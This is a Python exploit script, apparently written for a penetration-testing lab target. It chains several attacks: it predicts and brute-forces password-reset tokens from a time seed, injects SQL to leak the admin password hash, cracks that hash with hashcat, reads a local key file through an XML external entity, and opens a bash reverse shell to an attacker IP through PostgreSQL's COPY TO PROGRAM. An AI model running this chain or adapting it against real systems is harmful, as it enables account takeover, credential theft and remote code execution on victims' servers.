import time
import base64
import re
import json
import subprocess
import httpx
import jaydebeapi
from concurrent.futures import ThreadPoolExecutor
from http.server import HTTPServer, SimpleHTTPRequestHandler

proxy = {
        "http://": "http://localhost:8080",
        "https://": "http://localhost:8080",
}

client = httpx.Client(
        verify=False,
        timeout=10.0,
#        proxies=proxy,
)

# Config
TARGET_IP = "answers" # add entry in /etc/hosts
TARGET_PORT = "80"
ATTACKER_IP = "192.168.45.156"
REVSHELL_PORT = "4444"
HTTPSERVER_PORT = "80"
URL = f"http://{TARGET_IP}:{TARGET_PORT}/"

class CustomHTTPHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/xml")
        self.end_headers()
        self.wfile.write(b"<!ENTITY wrapper \"%start;%file;%end;\">");

def run_background_http_server():
    server = HTTPServer((ATTACKER_IP, int(HTTPSERVER_PORT)), CustomHTTPHandler)
    executor = ThreadPoolExecutor()
    executor.submit(server.serve_forever)
    executor.shutdown(wait=False)
    return server

def request_password_reset(userid, username):
    seed_start = round(time.time() * 1000)
    data = {"username":username}
    res = client.post(f"{URL}generateMagicLink", data=data)
    assert res.status_code == 302
    seed_end = round(time.time() * 1000)

    print(f"Seed generated: {seed_start} ~ {seed_end}")

    process = subprocess.Popen(f"java TokenUtil {userid} {str(seed_start)} {str(seed_end)}",
                               shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    tokens = list(set(stdout.decode().split("\n")))
    return tokens

def bruteforce_tokens(username, tokens):
    for t in tokens:
        res = client.get(f"{URL}magicLink/{t}")
        if "set-cookie" in res.headers:
            print(f"[+] Successfully generate token.: {t}")
            print(f"Session Cookie: {res.headers['set-cookie']}")
            return 
    raise ValueError("Failed to reset password.")

def show_admin_password():
    data = {"active": True, "mod": "true,description=(select password from users where username=$$admin$$)-- -"}
    res = client.post(f"{URL}moderate/9", data=data)

    assert res.status_code == 302

    res = client.get(f"{URL}moderate")
    reg = r"<p>(.*)<\/p>[\r|\n|\r\n]+\t+<form action=\"\/moderate\/\w\""

    password_hash = re.findall(reg, res.text)[0]
    hex = base64.b64decode(password_hash).hex()
    print(f"[+] admin password hash found. : {hex}")

    cracked = "" 
    for line in crack_hash(hex):
        if f"{hex}:" in line.decode():
            cracked = line.decode().split(":")[1].rstrip()
    
    assert cracked != ""
    
    print(f"[+] Password cracked successfully. : {cracked}")
    return cracked

def crack_hash(hash):
    print(f"[+] Cracking password...")

    cmd = f"hashcat -m 100 -a 0 {hash} /usr/share/wordlists/rockyou.txt --show"
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    while True:
        line = proc.stdout.readline()
        if line:
            yield line

        if not line and proc.poll() is not None:
            break


def login_as_admin(admin_password):
    client.cookies.clear()
    data = {"username":"admin","password":admin_password,"submit":"Submit"}

    res = client.post(f"{URL}login", data=data)

    assert "JSESSIONID" in res.cookies

def get_adminkey_via_xxe():
    xml = """<!--?xml version="1.0" ?-->
    <!DOCTYPE foo [<!ENTITY example SYSTEM "/home/student/adminkey.txt"> ]>
    <database>
    <test>
    &example;
    </test>
    </database>
"""

    data = {"preview":"true", "xmldata":xml}
    #res = client.post(f"{URL}admin/import", data=data)
    res = client.post(f"{URL}admin/import", data=data)
    reg = r"<test>[\n|\r|\r\n]+\s+(.*)"
    key = re.findall(reg, res.text)[0]
    print(f"[+] admin key found. : {key}")

def reverse_shell(adminkey):
    data = {
        "adminKey":"0cc2eebf-aa4b-4f9c-8b6c-ad7d44422d9b",
        "query":f"copy (select $$$$) to program $$bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/{REVSHELL_PORT} 0>&1'$$"
    }
    print("[+] attempt reverse shell...")
    print("[+] Please check listener.")

    client.post(f"{URL}admin/query", data=data)

if __name__ == "__main__":
    username = "Carl"
    userid = 5
    tokens = request_password_reset(userid, username)
    bruteforce_tokens(username, tokens)
    admin_password = show_admin_password()
    login_as_admin(admin_password)
    adminkey = get_adminkey_via_xxe()
    reverse_shell(adminkey)

